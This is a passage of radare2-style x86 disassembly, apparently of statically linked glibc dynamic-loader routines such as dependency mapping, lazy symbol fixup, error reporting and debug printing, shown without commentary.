test byte [0x80aac10], 1
je 0x80804e3
mov dword [var_4h], esi
mov dword [esp], str.cannot_load_auxiliary___s_because_of_empty_dynamic_string_token_substitution_n
call fcn.08081c40
jmp 0x80804e3
xor edx, edx
jmp 0x8080b0b
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0xf0
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str._l___l_name_0___0
jmp 0x8080894
xor edx, edx
cmp eax, 0xffffffff
je 0x8080b0b
mov dword [esp], eax
call fcn.08053400
jmp 0x8080b09
xor ecx, ecx
mov edx, edi
mov dword [esp], str.DST_not_allowed_in_SUID_SGID_programs
xor eax, eax
jmp 0x80807c2
cmp eax, 0x7ffffffd
je 0x8080bda
cmp eax, 0x7fffffff
jne 0x80804e3
mov edx, dword [var_70h]
mov esi, dword [var_68h]
add esi, dword [edx + 4]
mov dword [var_4h], 0x24
mov dword [esp], esi
mov edi, esi
call fcn.08076ce0
test eax, eax
jne 0x8080e15
mov edx, dword [var_70h]
mov dword [var_24h], edi
cmp dword [edx], 0x7ffffffd
je 0x8080da8
test byte [0x80aac10], 1
jne 0x8080d7d
lea eax, [var_34h]
lea edx, [var_38h]
mov ecx, 0x80801c0
mov dword [esp], eax
lea eax, [var_3ch]
call fcn.08081410
mov edx, dword [var_38h]
sub esp, 4
test edx, edx
jne 0x8080a80
mov edx, dword [var_6ch]
sub esp, 0x1c
lea edi, [var_1fh_2]
and edi, 0xfffffff0
mov eax, dword [edx]
mov dword [edi], eax
mov eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [var_20h]
mov dword [edx], 0
mov dword [edx + 4], eax
mov eax, dword [var_60h]
test eax, eax
je 0x8080c80
mov ecx, dword [var_64h]
mov eax, dword [var_20h]
mov esi, dword [var_60h]
mov dword [esi + ecx*4], eax
inc ecx
mov dword [var_64h], ecx
mov ecx, dword [var_20h]
movzx eax, byte [ecx + 0x174]
mov esi, ecx
test al, 0x60
je 0x8080d52
mov eax, dword [edi + 8]
mov edx, edi
test eax, eax
je 0x8080d4a
mov eax, dword [edx + 8]
cmp dword [eax + 4], esi
je 0x8080cb4
mov edx, eax
mov eax, dword [eax + 8]
test eax, eax
jne 0x8080ca1
xor eax, eax
test eax, eax
je 0x8080d32
mov eax, dword [var_6ch]
mov dword [eax + 8], edi
mov eax, dword [edx + 8]
cmp dword [var_4ch], eax
mov eax, dword [var_4ch]
cmove eax, edx
mov dword [var_4ch], eax
mov eax, dword [edx + 8]
mov eax, dword [eax + 8]
mov dword [edx + 8], eax
mov edx, dword [esi + 0x10]
test edx, edx
je 0x8080ce6
mov eax, dword [esi + 0xc]
mov dword [edx + 0xc], eax
mov ecx, dword [var_20h]
mov edx, dword [ecx + 0xc]
test edx, edx
je 0x8080cf6
mov eax, dword [ecx + 0x10]
mov dword [edx + 0x10], eax
mov ecx, dword [var_20h]
mov eax, dword [edi + 4]
mov eax, dword [eax + 0x10]
mov dword [ecx + 0x10], eax
mov eax, dword [var_20h]
mov edx, dword [edi + 4]
mov dword [edx + 0x10], eax
mov ecx, dword [var_20h]
mov eax, dword [ecx + 0x10]
test eax, eax
je 0x8080d18
mov dword [eax + 0xc], ecx
mov ecx, dword [var_20h]
mov eax, dword [edi + 4]
mov dword [ecx + 0xc], eax
mov eax, dword [var_4ch]
cmp dword [var_6ch], eax
mov dword [var_6ch], edi
cmove eax, edi
mov dword [var_4ch], eax
jmp 0x80804e3
mov eax, dword [edi]
mov edx, dword [var_6ch]
mov dword [edx], eax
mov eax, dword [edi + 4]
mov dword [edx + 4], eax
mov eax, dword [edi + 8]
mov dword [edx + 8], eax
jmp 0x80804e3
mov eax, dword [edi + 8]
jmp 0x8080cb4
mov esi, dword [var_6ch]
and eax, 0xffffff9f
inc dword [var_14h]
or eax, 0x20
mov dword [esi + 8], edi
mov byte [ecx + 0x174], al
mov ecx, dword [var_20h]
mov edx, dword [ecx + 0x10]
test edx, edx
je 0x8080ce6
mov eax, dword [ecx + 0xc]
jmp 0x8080ce0
mov esi, dword [var_5ch]
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x8080d8f
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], edi
mov dword [esp], str.load_filtered_object_s_requested_by_file_s_n
call fcn.08081c40
jmp 0x8080c1c
test byte [0x80aac10], 1
jne 0x8080ded
lea eax, [var_34h]
mov ecx, 0x80801c0
lea edx, [var_38h]
mov dword [esp], eax
lea eax, [var_3ch]
call fcn.08081410
mov eax, dword [var_38h]
sub esp, 4
test eax, eax
je 0x8080c40
cmp eax, str.out_of_memory
je 0x80804e3
mov dword [esp], eax
call fcn.08051180
jmp 0x80804e3
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x8080dff
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], edi
mov dword [esp], str.load_auxiliary_object_s_requested_by_file_s_n
call fcn.08081c40
jmp 0x8080db1
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.0807aeb0
test eax, eax
je 0x8080bfd
mov eax, dword [0x80a95f4]
test eax, eax
jne 0x8080bb6
mov dword [esp], esi
call fcn.08053400
mov ecx, dword [var_78h]
mov edi, eax
test ecx, ecx
je 0x8080e9d
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 0x190]
test eax, eax
jne 0x8080f0a
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x8080ef5
call fcn.08083280
mov edx, dword [var_5ch]
test eax, eax
mov dword [edx + 0x190], eax
je 0x8080ef1
cmp eax, 0xffffffff
je 0x8080ef1
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul eax, dword [var_78h]
lea eax, [eax + edi]
add eax, 0x12
mov ecx, dword [var_5ch]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_sp_ch], 0
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.0807af60
cmp byte [eax], 0
mov edi, eax
jne 0x8080bfd
mov eax, dword [var_70h]
cmp dword [eax], 0x7ffffffd
jne 0x8080b54
mov dword [esp], str.empty_dynamics_string_token_substitution
xor ecx, ecx
mov edx, esi
jmp 0x8080bc1
xor edx, edx
jmp 0x8080e89
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x11c
jmp 0x8080b8a
xor edx, edx
cmp eax, 0xffffffff
je 0x8080e89
mov dword [esp], eax
call fcn.08053400
jmp 0x8080e87
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
sub esp, 0x28
mov ecx, dword [eax + 0x30]
mov eax, dword [eax + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_14h], eax
mov eax, dword [esi + 0x74]
add edx, dword [eax + 4]
mov eax, dword [edx + 4]
mov edx, dword [edx]
mov ebx, eax
shr ebx, 8
mov dword [var_18h], ebx
shl ebx, 4
add ebx, dword [ecx + 4]
mov ecx, dword [esi]
add edx, ecx
mov dword [var_10h], ebx
cmp al, 7
mov dword [var_1ch], edx
jne 0x8081024
movzx eax, byte [ebx + 0xd]
mov edi, ebx
and eax, 3
mov dword [var_20h], eax
jne 0x808101d
mov edx, dword [esi + 0xdc]
xor eax, eax
test edx, edx
je 0x8080fb3
mov eax, dword [edx + 4]
mov edx, dword [var_18h_2]
movzx eax, word [eax + edx*2]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
add eax, dword [esi + 0x17c]
mov ecx, dword [eax + 4]
test ecx, ecx
cmove eax, dword [var_20h]
mov ebx, dword [edi]
lea ecx, [var_10h_2]
mov edx, esi
mov dword [var_4h], eax
add dword [var_14h_2], ebx
mov dword [esp + 0x10], 0
mov eax, dword [esi + 0x1b4]
mov dword [var_ch], 1
mov dword [var_8h], 1
mov dword [esp], eax
mov eax, dword [var_14h_2]
call fcn.0807e450
mov edx, dword [var_10h_2]
sub esp, 0x14
mov ecx, eax
xor eax, eax
test edx, edx
je 0x8081001
test ecx, ecx
je 0x8081018
mov eax, dword [edx + 4]
add eax, dword [ecx]
mov edx, dword [0x80aac30]
test edx, edx
jne 0x8081010
mov edx, dword [var_1ch_2]
mov dword [edx], eax
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edx + 4]
jmp 0x8081001
mov eax, ecx
add eax, dword [ebx + 4]
jmp 0x8081001
mov dword [var_ch], 0x80a4678
mov dword [var_8h], 0x4c
mov dword [var_4h], str.dl_runtime.c
mov dword [esp], str.__reloc__r_info___0xff___7
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
mov ebx, edx
shr edx, 3
sub esp, 0x28
mov eax, dword [eax + 0x188]
mov dword [var_14h_2], ecx
lea edx, [eax + edx*4]
mov edi, dword [edx]
mov dword [var_18h_2], edx
test edi, edi
jne 0x808113a
mov eax, dword [esi + 0x2c]
mov edx, dword [esi + 0x30]
mov eax, dword [eax + 4]
mov dword [var_1ch_2], eax
mov eax, dword [esi + 0x74]
add ebx, dword [eax + 4]
mov eax, dword [ebx + 4]
mov ecx, eax
shr ecx, 8
mov dword [var_20h], ecx
shl ecx, 4
add ecx, dword [edx + 4]
cmp al, 7
mov dword [var_10h_2], ecx
jne 0x808115f
test byte [ecx + 0xd], 3
mov ebx, ecx
jne 0x8081158
mov edx, dword [esi + 0xdc]
xor eax, eax
test edx, edx
je 0x80810e1
mov eax, dword [edx + 4]
mov edx, dword [var_20h]
movzx eax, word [eax + edx*2]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
add eax, dword [esi + 0x17c]
mov edx, dword [eax + 4]
test edx, edx
cmove eax, edi
mov ecx, dword [ebx]
mov edx, esi
mov dword [var_4h_2], eax
mov eax, dword [esi + 0x1b4]
add dword [var_1ch_2], ecx
mov dword [var_sp_10h], 0
lea ecx, [var_10h_2]
mov dword [var_ch_2], 1
mov dword [var_8h_2], 1
mov dword [esp], eax
mov eax, dword [var_1ch_2]
call fcn.0807e450
mov edx, dword [var_10h_2]
sub esp, 0x14
test edx, edx
je 0x808112b
test eax, eax
je 0x8081153
mov edi, dword [edx + 4]
add edi, dword [eax]
mov ebx, dword [0x80aac30]
test ebx, ebx
jne 0x808113a
mov eax, dword [var_18h_2]
mov dword [eax], edi
mov edx, dword [var_14h_2]
mov dword [var_4h_2], edi
mov dword [esp], edx
call fcn.08082c50
lea esp, [var_bp_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [edx + 4]
jmp 0x808112b
mov edi, dword [ecx + 4]
add edi, dword [esi]
jmp 0x808112b
mov dword [var_ch_2], str.profile_fixup
mov dword [var_8h_2], 0xa0
mov dword [var_4h_2], str.dl_runtime.c
mov dword [esp], str.__reloc__r_info___0xff___7
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push eax
push ecx
push edx
mov edx, dword [var_4h_2]
mov eax, dword [var_ch_3]
call fcn.08080f30
pop edx
pop ecx
xchg dword [esp], eax
ret 8
nop
lea esi, [esi]
push eax
push ecx
push edx
mov ecx, dword [esp + 0x14]
mov edx, dword [esp + 0x10]
mov eax, dword [esp + 0xc]
call fcn.08081050
pop edx
pop ecx
xchg dword [esp], eax
ret 8
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, ecx
push ebx
sub esp, 0x44c
mov ebx, dword [arg_8h]
mov dword [var_41ch], eax
mov eax, str.DYNAMIC_LINKER_BUG___
test ebx, ebx
cmovne eax, dword [arg_8h]
mov dword [arg_8h], eax
call dword [0x80a9c20]
test edi, edi
mov ebx, dword [eax]
mov eax, 0x80a4f11
cmove edi, eax
test ebx, ebx
je 0x80812d5
mov dword [esp], edi
call fcn.08053400
inc eax
mov dword [var_420h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [var_420h]
add eax, esi
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [ebx + 4], eax
je 0x80812c6
mov edx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edx
mov eax, dword [ebx + 4]
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], edi
mov edx, dword [var_420h]
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.08053770
mov dword [ebx], eax
mov ecx, dword [var_41ch]
mov eax, 0xffffffff
test ecx, ecx
cmovne eax, dword [var_41ch]
mov dword [var_4h], eax
lea eax, [ebx + 8]
mov dword [esp], eax
call fcn.08084a80
mov dword [ebx], 0x80a4f11
mov dword [ebx + 4], 0x80a467e
jmp 0x80812a3
mov edx, dword [var_41ch]
mov eax, 0x80a4f11
test edx, edx
jne 0x808135b
mov dword [var_20h], eax
mov edx, 0x8092923
mov ecx, 0x80a4f11
mov eax, dword [var_41ch]
test eax, eax
mov eax, edx
cmove eax, ecx
mov dword [var_1ch], eax
mov eax, dword [arg_8h]
mov dword [var_18h], eax
mov eax, str.error_while_loading_shared_libraries
cmp byte [edi], 0
mov dword [var_10h], edi
cmove edx, ecx
test esi, esi
cmovne eax, esi
mov dword [var_14h], edx
mov dword [var_ch], eax
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], 2
mov dword [var_4h], str._s:__s:__s_s_s_s_s_n
mov eax, str._program_name_unknown_
test edx, edx
cmovne eax, edx
mov dword [var_8h], eax
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
lea eax, [var_418h]
mov dword [var_8h], 0x400
mov dword [var_4h], eax
mov eax, dword [var_41ch]
mov dword [esp], eax
call fcn.08053300
jmp 0x80812e4
push ebp
mov ebp, esp
sub esp, 0x28
test dword [0x80aac10], 0xfffffd7f
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, edx
mov dword [var_10h], ecx
mov esi, dword [arg_8h]
mov edi, eax
jne 0x80813c8
mov eax, dword [0x80aaa0c]
test eax, eax
je 0x80813fa
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], ebx
mov dword [esp], edi
call eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov edi, dword [var_4h_2]
leave
ret 4
mov eax, dword [0x80aaa0c]
mov edx, str.continued
mov dword [var_sp_ch], esi
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], str._s:_error:__s:__s___s__n
test eax, eax
mov eax, str.fatal
cmove edx, eax
mov dword [var_sp_10h], edx
call fcn.08081c40
jmp 0x80813a5
mov ecx, dword [var_10h]
mov edx, ebx
mov eax, edi
mov dword [esp], esi
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xf8
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_dch], eax
mov dword [var_e0h], edx
mov dword [var_e4h], ecx
mov dword [var_d4h], 0
call dword [0x80a9c20]
mov dword [var_e8h], eax
mov eax, dword [eax]
mov dword [var_1ch], eax
lea eax, [var_d0h]
mov dword [esp], eax
call fcn.08084a40
test eax, eax
mov edx, eax
jne 0x80814af
mov ecx, dword [var_e8h]
lea eax, [var_d8h]
mov dword [ecx], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [var_e4h]
mov eax, dword [var_1ch]
mov edx, dword [var_e8h]
mov ecx, dword [var_dch]
mov dword [edx], eax
mov eax, dword [var_e0h]
mov dword [ecx], 0
mov dword [eax], 0
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret 4
mov eax, dword [var_1ch]
mov ecx, dword [var_e8h]
mov dword [ecx], eax
mov ecx, dword [var_dch]
mov eax, dword [var_d8h]
mov dword [ecx], eax
mov ecx, dword [var_e0h]
mov eax, dword [var_d4h]
mov dword [ecx], eax
xor eax, eax
cmp edx, 0xffffffff
cmovne eax, edx
jmp 0x80814a2
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_14h], edx
mov dword [var_18h], ecx
mov dword [var_10h], eax
call dword [0x80a9c20]
mov edi, dword [0x80aaa0c]
mov esi, dword [eax]
mov ebx, eax
mov dword [eax], 0
mov eax, dword [var_10h]
mov dword [0x80aaa0c], eax
mov eax, dword [var_18h]
mov dword [esp], eax
call dword [var_14h]
mov dword [ebx], esi
mov dword [0x80aaa0c], edi
mov esi, dword [var_8h]
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
movzx eax, byte [ebx + 0x174]
test al, 8
jne 0x8081584
mov edx, eax
mov eax, dword [ebx + 4]
or edx, 8
mov byte [ebx + 0x174], dl
movzx ecx, byte [eax]
test cl, cl
je 0x808161e
mov edx, dword [ebx + 0x48]
test edx, edx
jne 0x808158f
mov esi, dword [ebx + 0x7c]
test esi, esi
jne 0x808158f
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
test byte [0x80aac10], 2
jne 0x80815fb
test edx, edx
jne 0x80815de
mov edx, dword [ebx + 0x7c]
test edx, edx
je 0x8081584
mov eax, dword [ebx + 0x84]
mov edi, dword [ebx]
xor ebx, ebx
add edi, dword [edx + 4]
mov esi, dword [eax + 4]
shr esi, 2
cmp ebx, esi
jae 0x8081584
lea esi, [esi]
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], edx
mov eax, dword [arg_ch]
mov dword [esp], eax
call dword [edi + ebx*4]
inc ebx
cmp ebx, esi
jb 0x80815c0
jmp 0x8081584
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
add eax, dword [ebx]
mov dword [var_sp_8h], edx
mov edx, dword [arg_10h]
mov dword [var_sp_4h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
call eax
jmp 0x808159c
test cl, cl
jne 0x8081606
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_sp_4h], eax
mov dword [esp], str._ncalling_init:__s_n_n
call fcn.08081c40
mov edx, dword [ebx + 0x48]
jmp 0x8081598
and edx, 3
test dl, dl
je 0x8081584
jmp 0x8081576
mov esi, esi
push ebp
mov ebp, esp
push edi
mov edi, ecx
push esi
mov esi, eax
push ebx
sub esp, 0x2c
mov ebx, dword [esi + 0x9c]
mov eax, dword [eax + 0x98]
mov dword [var_10h], edx
mov dword [var_14h], eax
mov eax, dword [0x80aac64]
test eax, eax
jne 0x8081747
mov eax, dword [var_14h]
test eax, eax
jne 0x80816cb
xor eax, eax
call fcn.08081770
mov dword [eax + 0xc], 1
mov dword [var_18h], eax
call fcn.080817b0
mov ebx, dword [esi + 0x154]
mov eax, ebx
dec ebx
test eax, eax
jne 0x808169f
mov eax, dword [var_18h]
mov dword [eax + 0xc], 0
call fcn.080817b0
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [arg_8h]
mov edx, dword [var_10h]
mov dword [var_8h], edi
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [esi + 0x1d8]
mov eax, dword [eax + ebx*4]
mov dword [esp], eax
call fcn.08081540
mov eax, ebx
dec ebx
test eax, eax
jne 0x808169f
jmp 0x8081686
test ebx, ebx
je 0x8081663
mov eax, dword [ebx + 4]
mov ebx, eax
shr ebx, 2
je 0x8081663
test byte [0x80aac10], 2
jne 0x8081726
mov edx, dword [var_14h]
mov eax, dword [esi]
mov edx, dword [edx + 4]
mov dword [var_20h], 0
add eax, edx
cmp dword [var_20h], ebx
mov dword [var_1ch], eax
jae 0x8081663
mov eax, dword [arg_8h]
mov edx, dword [var_10h]
mov dword [var_4h], edi
mov dword [var_8h], eax
mov dword [esp], edx
mov eax, dword [var_20h]
mov edx, dword [var_1ch]
call dword [edx + eax*4]
inc dword [var_20h]
cmp dword [var_20h], ebx
jb 0x80816ff
jmp 0x8081663
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x8081735
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str._ncalling_preinit:__s_n_n
call fcn.08081c40
jmp 0x80816e2
mov edx, dword [arg_8h]
mov dword [var_8h], ecx
mov dword [esp], eax
mov dword [var_ch], edx
mov edx, dword [var_10h]
mov dword [var_4h], edx
call fcn.08081540
mov dword [0x80aac64], 0
jmp 0x808165c
mov edx, dword [0x80aad38]
push ebp
mov ebp, esp
test edx, edx
jne 0x80817a0
mov dword [0x80aad40], eax
mov dword [0x80aad30], 1
mov dword [0x80aad38], 0x80817b0
mov eax, dword [0x80aac58]
mov dword [0x80aad34], eax
mov eax, 0x80aad30
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x88
mov dword [var_4h], 0
mov dword [esp], eax
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_bp_4h], edi
mov dword [var_70h], 0xffffffff
mov esi, edx
mov edi, ecx
call fcn.08053ec0
test eax, eax
mov ebx, eax
js 0x808181f
lea eax, [var_6ch]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_sp_8h], eax
call fcn.08053dc0
test eax, eax
js 0x8081817
mov eax, dword [var_40h]
test eax, eax
mov dword [esi], eax
jne 0x808182d
mov dword [esp], ebx
call fcn.08053f20
mov eax, dword [var_70h]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov dword [var_14h], 0
mov dword [var_10h], ebx
mov dword [var_sp_ch], 2
mov dword [var_sp_8h], edi
mov dword [var_4h], eax
mov dword [esp], 0
call fcn.080546d0
mov dword [var_70h], eax
jmp 0x8081817
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x23c
mov dword [var_220h], 0
mov esi, dword [arg_10h]
movzx ebx, byte [esi]
test bl, bl
je 0x808193c
mov eax, dword [arg_ch]
mov dword [var_224h], esi
test eax, eax
jle 0x80818cd
mov ecx, dword [var_220h]
test ecx, ecx
je 0x8081bb4
cmp edi, 0x3f
jg 0x8081ba2
lea eax, [var_21ch]
mov dword [ebp + edi*8 - 0x208], 0xc
mov dword [arg_ch], 0xffffffff
mov dword [ebp + edi*8 - 0x20c], eax
movzx ebx, byte [esi]
inc edi
test bl, bl
je 0x8081900
cmp bl, 0x25
je 0x8081900
mov edx, dword [arg_ch]
test edx, edx
jne 0x8081b94
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x8081900
cmp bl, 0x25
je 0x8081900
mov eax, dword [arg_ch]
test eax, eax
je 0x80818e1
cmp bl, 0xa
jne 0x80818e1
lea esi, [esi]
cmp edi, 0x3f
jg 0x8081b70
mov eax, esi
sub eax, dword [var_224h]
test eax, eax
mov dword [ebp + edi*8 - 0x208], eax
je 0x808192a
mov edx, dword [var_224h]
mov dword [ebp + edi*8 - 0x20c], edx
inc edi
cmp bl, 0x25
je 0x8081987
cmp bl, 0xa
je 0x8081956
test bl, bl
jne 0x8081886
lea ecx, [var_20ch]
mov ebx, dword [arg_8h]
mov edx, edi
mov eax, 0x92
int 0x80
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp esi, dword [var_224h]
je 0x8081972
inc dword [ebp + edi*8 - 0x210]
mov dword [arg_ch], 1
inc esi
movzx ebx, byte [esi]
jmp 0x8081934
mov dword [ebp + edi*8 - 0x20c], esi
mov dword [ebp + edi*8 - 0x208], 1
inc edi
jmp 0x8081965
inc esi
mov byte [var_225h], 0x20
mov dword [var_22ch], 0xffffffff
mov dword [var_230h], 0xffffffff
movzx ebx, byte [esi]
cmp bl, 0x30
je 0x8081b60
cmp bl, 0x2a
je 0x8081b48
cmp bl, 0x2e
je 0x8081b24
cmp bl, 0x6c
je 0x8081b1b
cmp bl, 0x5a
je 0x8081b1b
movsx eax, bl
cmp eax, 0x75
je 0x8081a7f
jg 0x8081a76
cmp eax, 0x25
je 0x8081a62
cmp eax, 0x73
je 0x8081a20
mov eax, str.invalid_format_specifier
test eax, eax
je 0x808196c
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0xe3
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.___invalid_format_specifier_
call fcn.0805efc0
mov eax, dword [arg_14h]
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [ebp + edi*8 - 0x20c], eax
mov dword [esp], eax
call fcn.08053400
cmp dword [var_230h], 0xffffffff
mov dword [ebp + edi*8 - 0x208], eax
je 0x8081a5c
cmp eax, dword [var_230h]
cmova eax, dword [var_230h]
mov dword [ebp + edi*8 - 0x208], eax
inc edi
jmp 0x808196c
mov dword [ebp + edi*8 - 0x20c], esi
mov dword [ebp + edi*8 - 0x208], 1
jmp 0x8081a5c
cmp eax, 0x78
jne 0x80819ef
mov eax, dword [arg_14h]
sub esp, 0x1c
mov edx, 0x10
add dword [arg_14h], 4
mov ecx, dword [eax]
mov dword [var_4h_2], 0
mov dword [var_10h], 0
lea eax, [var_4h]
or eax, 0xc
cmp bl, 0x78
mov dword [var_234h], eax
mov dword [esp], ecx
mov eax, 0xa
cmovne edx, eax
mov dword [esp + 0xc], edx
mov edx, dword [var_234h]
mov dword [var_8h_2], edx
call fcn.08063ca0
cmp dword [var_22ch], 0xffffffff
mov edx, eax
je 0x8081b03
mov eax, dword [var_234h]
sub eax, edx
cmp eax, dword [var_22ch]
jge 0x8081b03
movzx ebx, byte [var_225h]
dec edx
mov byte [edx], bl
mov eax, dword [var_234h]
sub eax, edx
cmp eax, dword [var_22ch]
jl 0x8081ae9
sub dword [var_234h], edx
mov dword [ebp + edi*8 - 0x20c], edx
mov eax, dword [var_234h]
jmp 0x8081a55
inc esi
movzx ebx, byte [esi]
jmp 0x80819d3
cmp byte [esi + 1], 0x2a
jne 0x80819c1
mov eax, dword [arg_14h]
add esi, 2
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [var_230h], eax
movzx ebx, byte [esi]
jmp 0x80819c1
mov eax, dword [arg_14h]
inc esi
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [var_22ch], eax
movzx ebx, byte [esi]
jmp 0x80819b8
inc esi
mov byte [var_225h], 0x30
movzx ebx, byte [esi]
jmp 0x80819af
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x83
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.niov___64
jmp 0x8081a1b
cmp bl, 0xa
jne 0x80818e1
jmp 0x8081900
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x76
jmp 0x8081b80
call fcn.08053db0
test eax, eax
mov dword [var_220h], eax
js 0x8081c1b
lea eax, [var_212h]
mov dword [var_10h_2], 0
mov dword [var_sp_ch], 0xa
mov dword [var_8h], eax
lea ebx, [var_21ch]
mov eax, dword [var_220h]
cdq
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08063ca0
cmp eax, ebx
jbe 0x8081c08
lea esi, [esi]
dec eax
cmp eax, ebx
mov byte [eax], 0x20
ja 0x8081c00
mov byte [var_212h], 0x3a
mov byte [var_211h], 9
jmp 0x80818a1
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x6d
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.pid___0__sizeof__pid_t____4
jmp 0x8081a1b
nop
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_ch]
mov dword [var_4h], 1
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_8h], eax
mov eax, dword [0x80a95c0]
mov dword [esp], eax
call fcn.08081860
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_ch]
mov dword [var_4h], 0xffffffff
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_8h], eax
mov eax, dword [0x80a95c0]
mov dword [esp], eax
call fcn.08081860
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_10h]
mov dword [var_4h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08081860
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push esi
mov esi, eax
push ebx
mov ebx, edx
sub esp, 8
mov eax, dword [edx + 4]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x8081d20
mov ebx, dword [ebx + 0x14]
test ebx, ebx
je 0x8081d1e
nop
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x8081d20
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x8081d00
xor edx, edx
add esp, 8
mov eax, edx
pop ebx
